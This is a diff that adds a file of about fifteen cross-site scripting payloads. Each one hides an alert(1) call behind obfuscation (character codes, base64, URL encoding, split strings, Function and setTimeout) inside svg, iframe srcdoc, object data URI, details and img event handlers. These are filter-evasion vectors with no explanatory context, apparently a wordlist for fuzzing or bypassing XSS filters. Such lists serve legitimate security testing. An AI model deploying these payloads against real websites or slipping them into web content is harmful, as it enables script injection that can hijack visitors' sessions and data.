@@ -1,0 +1,15 @@
+<svg onload=window[unescape('%61%6c%65%72%74')](1)>
+<iframe srcdoc="<svg onload=Function('al'+'ert(1)')()>"></iframe>
+<object data="data:text/html,<svg onload=window%5b%22al%22+%22ert%22%5d(1)></svg>"></object>
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<img src=x onerror=Function('javascri'+'pt:alert(1)')()>"></iframe>
+<object data="data:text/html,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></object>
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>
+<iframe srcdoc="<svg onload=Function('al'+String.fromCharCode(101,114,116,40,49,41))()>"></iframe>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>"></iframe>
+<iframe srcdoc="<svg onload=Function('al'+String.fromCharCode(101,114,116,40,49,41))()>"></iframe>
+<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>
+<svg onload=setTimeout(Function('al'+'ert(1)'),0)>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(String.fromCharCode(97)+unescape('%6c%65%72%74(1)'))>
+<object data="data:text/html,<img src=x onerror=setTimeout(Function('al'+'ert(1)'),0)>"></object>
